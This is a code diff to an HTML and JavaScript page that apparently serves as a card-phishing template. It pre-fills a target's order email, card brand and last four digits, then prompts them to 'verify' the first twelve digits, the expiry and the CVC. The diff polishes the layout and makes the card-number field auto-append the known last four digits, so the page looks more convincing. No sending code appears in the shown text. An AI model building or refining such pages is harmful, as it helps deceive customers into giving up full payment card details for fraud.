@@ -152,7 +152,7 @@
       .panel-right {
         flex: 1;
         background: #fff;
-        padding: 48px 48px 48px 48px;
+        padding: 108px 48px 48px 48px;
         display: flex;
         justify-content: flex-start;
       }
@@ -293,6 +293,10 @@
         display: flex;
       }
 
+      .card-verify-split.card-verify-row {
+        padding: 0;
+      }
+
       .card-verify-half {
         flex: 1;
         height: 44px;
@@ -308,9 +312,10 @@
       .card-verify-half .text-input {
         border: none;
         border-radius: 0;
-        padding: 0;
+        padding: 0 0 0 0;
         height: 100%;
         background: transparent;
+        letter-spacing: 0.5px;
       }
 
       .card-verify-half .text-input:focus {
@@ -514,9 +519,8 @@
               <label class="form-label">Card verification</label>
               <div class="card-verify-group">
                 <div class="card-verify-row">
-                  <input type="text" id="cardNumber" class="text-input" style="border:none;border-radius:0;padding:0;height:100%;background:transparent;letter-spacing:1px;flex:1;" placeholder="•••• •••• ••••" maxlength="14" />
-                  <span id="card-last4-display" style="font-size:14px;font-weight:500;color:rgba(26,26,26,0.9);letter-spacing:1px;margin-right:8px;"></span>
-                  <span class="card-brand-icon"><svg viewBox="0 0 32 20" xmlns="http://www.w3.org/2000/svg"><rect width="32" height="20" rx="2" fill="#fff"/><text x="16" y="13" text-anchor="middle" fill="#1a1f71" font-size="8" font-weight="700" font-style="italic" font-family="Arial">VISA</text></svg></span>
+                  <input type="text" id="cardNumber" class="text-input" style="border:none;border-radius:0;padding:0;height:100%;background:transparent;letter-spacing:0.5px;flex:1;" placeholder="•••• •••• •••• ••••" maxlength="19" />
+                  <span class="card-brand-icon" id="card-brand-icon"></span>
                 </div>
                 <div class="card-verify-split card-verify-row">
                   <div class="card-verify-half">
@@ -578,9 +582,29 @@
 
         // Right panel
         document.getElementById('form-email').textContent = p.order_email;
-        document.getElementById('card-last4-display').textContent = p.card_digits;
 
-        // Input formatters
+        // Card brand icon
+        const brandIcon = document.getElementById('card-brand-icon');
+        if (p.card_brand.toLowerCase() === 'mastercard') {
+          brandIcon.innerHTML = '<svg viewBox="0 0 32 20" xmlns="http://www.w3.org/2000/svg"><rect width="32" height="20" rx="2" fill="#fff"/><circle cx="12" cy="10" r="6" fill="#EB001B"/><circle cx="20" cy="10" r="6" fill="#F79E1B"/><path d="M16 5.3a6 6 0 010 9.4 6 6 0 000-9.4z" fill="#FF5F00"/></svg>';
+        } else {
+          brandIcon.innerHTML = '<svg viewBox="0 0 32 20" xmlns="http://www.w3.org/2000/svg"><rect width="32" height="20" rx="2" fill="#fff"/><text x="16" y="13" text-anchor="middle" fill="#1a1f71" font-size="8" font-weight="700" font-style="italic" font-family="Arial">VISA</text></svg>';
+        }
+
+        // Card number: pre-fill last 4, user types first 12
+        const cardEl = document.getElementById('cardNumber');
+        cardEl.placeholder = '•••• •••• •••• ' + p.card_digits;
+        cardEl.addEventListener('input', (e) => {
+          let v = e.target.value.replace(/[^\d]/g, '').slice(0, 12);
+          let formatted = v.replace(/(.{4})/g, '$1 ').trim();
+          if (v.length === 12) {
+            e.target.value = formatted + ' ' + p.card_digits;
+          } else {
+            e.target.value = formatted;
+          }
+        });
+
+        // Expiry formatter
         const expiryEl = document.getElementById('cardExpiry');
         expiryEl.addEventListener('input', (e) => {
           let v = e.target.value.replace(/[^\d]/g, '');
@@ -592,16 +616,10 @@
           }
         });
 
+        // CVC formatter
         const cvcEl = document.getElementById('cardCvc');
         cvcEl.addEventListener('input', (e) => {
           e.target.value = e.target.value.replace(/[^\d]/g, '').slice(0, 4);
-        });
-
-        const cardEl = document.getElementById('cardNumber');
-        cardEl.addEventListener('input', (e) => {
-          let v = e.target.value.replace(/[^\d]/g, '').slice(0, 12);
-          let formatted = v.replace(/(.{4})/g, '$1 ').trim();
-          e.target.value = formatted;
         });
       }
     </script>
